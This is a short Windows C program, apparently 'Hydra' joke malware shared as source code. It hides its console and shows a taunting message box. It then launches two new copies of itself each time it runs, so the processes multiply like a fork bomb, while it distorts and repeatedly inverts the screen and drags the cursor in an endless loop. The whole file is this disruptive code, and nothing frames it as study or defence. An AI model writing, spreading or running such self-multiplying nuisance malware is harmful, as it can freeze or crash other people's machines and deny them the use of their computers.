#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#if       _WIN32_WINNT < 0x0500
  #undef  _WIN32_WINNT
  #define _WIN32_WINNT   0x0500
#endif

#include <windows.h>

int count;
POINT pt;

void CursorMove()
{
    sleep(1);
    GetCursorPos(&pt);
    SetCursorPos(pt.x + 1, pt.y + 1);
}

int main()
{
    ShowWindow( GetConsoleWindow(), SW_HIDE );
    MessageBox(0, "Cut off one head, two more take its place", "Hydra", 0x00000000L);

    //CopyFile(__FILE__, "hydra.exe", 1);
    system("start hydra.exe");
    system("start hydra.exe");

    HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
    RECT rect;
    GetWindowRect(hwnd, &rect);
    int w = rect.right - rect.left;
    int h = rect.bottom - rect.top;

    StretchBlt(hdc, 50, 50, w - 100, h - 100, hdc, 0, 0, w, h, SRCCOPY);

    count = 0;
    while(1)
    {
        int i;
        for (i = 0; i <= 10; i++)
        {
            CursorMove();
        }

        // Inverts screen
        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);

        count++;
    }
    return 0;
}